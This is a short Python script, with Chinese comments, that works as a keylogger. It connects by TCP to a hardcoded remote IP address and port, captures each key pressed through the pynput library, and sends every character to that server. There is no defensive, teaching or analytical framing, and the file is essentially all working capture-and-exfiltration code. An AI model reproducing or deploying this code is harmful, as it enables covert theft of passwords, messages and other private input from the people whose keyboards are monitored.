"""键盘监听程序
将按键发送到远端服务器
"""

import socket
from pynput import keyboard


HOST = '49.235.15.235'
PORT = 1201
BUFSIZE = 1024
ADDR = (HOST, PORT)


tcpCliSock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
tcpCliSock.connect(ADDR)


def on_press(key):
    tcpCliSock.send(key.char.encode('utf-8'))
    print(key.char)
    if key == keyboard.Key.esc:
        # Stop listener
        return False


def on_release(key):
    print('key_up')


# 监听键盘按键
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
